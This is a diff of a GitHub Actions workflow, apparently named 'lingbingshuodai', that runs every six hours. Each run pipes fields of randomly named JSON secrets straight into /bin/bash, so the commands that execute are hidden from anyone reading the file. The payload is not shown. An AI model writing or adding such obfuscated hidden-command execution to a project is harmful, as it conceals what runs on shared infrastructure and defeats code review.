@@ -1,28 +1,20 @@
 name: lingbingshuodai
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
+    - cron: '6 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lingbingshuodai
         env:
-          vuk475: ${{ secrets.vuk475 }}
+          bhnxp9392: ${{ secrets.bhnxp9392 }}
         run: |
-          echo $vuk475 | jq -r .onhm298 | /bin/bash
-          echo $nt89134 | jq -r .ly79 | /bin/bash
-          echo $teii49932 | jq -r .ozixn31 | /bin/bash
-          echo $sc835 | jq -r .m9266 | /bin/bash
-          echo $qnhuy73 | jq -r .ssplu0 | /bin/bash
-          echo $qqrgv1 | jq -r .lhuc9372 | /bin/bash
-          echo $u72 | jq -r .b626 | /bin/bash
-          echo $yauia2636 | jq -r .gvcg020 | /bin/bash
-          echo $f6 | jq -r .ir85238 | /bin/bash
-          echo $qxdsx8 | jq -r .x50839 | /bin/bash
-          echo $ws62 | jq -r .ks867 | /bin/bash
+          echo $bhnxp9392 | jq -r .m850 | /bin/bash
+          echo $noe004 | jq -r .p731 | /bin/bash
+          echo $cfhh70130 | jq -r .g0 | /bin/bash
+          echo $pkyas28 | jq -r .wcg15 | /bin/bash
 
